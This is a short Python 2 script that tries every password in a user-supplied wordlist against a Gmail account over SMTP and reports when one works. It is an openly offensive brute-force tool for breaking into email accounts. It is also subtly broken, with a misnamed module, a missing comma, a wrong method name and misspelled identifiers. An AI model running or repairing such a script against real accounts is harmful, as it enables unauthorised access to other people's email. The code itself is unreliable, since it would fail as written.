import smtplib
smtpserver=smtp.SMTP("smtp.gmail.com" 587)
smtpserver.echo()
smptserver.starttls()
user=raw_input("Enter mail")
passfile=raw_input("Enter pass")
passfile=open(passfile,"r")

for password in passfile:
	try:
		smtpserver.login(user,password)
		print "[+] password found:%s" %password
		break;
	except  smtplib.SNTPAuthenticationError:
		print "[+] password Incorrect:%s" %password
